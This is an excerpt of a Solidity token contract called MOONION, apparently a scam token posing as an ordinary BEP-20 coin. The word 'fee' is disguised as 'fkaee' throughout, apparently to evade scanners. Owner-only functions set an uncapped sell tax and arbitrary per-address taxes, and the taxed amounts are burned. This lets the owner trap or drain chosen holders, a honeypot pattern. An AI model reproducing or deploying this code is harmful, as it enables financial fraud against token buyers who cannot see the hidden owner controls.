...
interface IUniswapV2Factory {
    ...
    function fkaeeTo() external view returns (address);
    function fkaeeToSetter() external view returns (address);
    ...
    function setfkaeeTo(address) external;
    function setfkaeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfkaeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfkaeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfkaeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfkaeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfkaeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract MOONION is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfkaee = 0;

    uint256 private _defaultBuyfkaee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfkaee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfkaee = _value;
    }

    function setSlipfkaee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfkaee[_address] = _value;
    }

    function getSlipfkaee(address _address) external view onlyownar returns (uint256) {
        return _slipfkaee[_address];
    }


    function setMAccountfkaee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfkaee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefkaeeAmount = 0;

        if (rF) {
            uint256 tradefkaee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefkaee = _defaultSellfkaee;
                }
                if (from == uniswapV2Pair) {

                    tradefkaee = _defaultBuyfkaee;
                }
            }
            if (_slipfkaee[from] > 0) {
                tradefkaee = _slipfkaee[from];
            }

            tradefkaeeAmount = _Amount.mul(tradefkaee).div(100);
        }


        if (tradefkaeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradefkaeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefkaeeAmount);
            emit Transfer(from, _deadAddress, tradefkaeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefkaeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefkaeeAmount);
        emit Transfer(from, _to, _Amount - tradefkaeeAmount);
    }
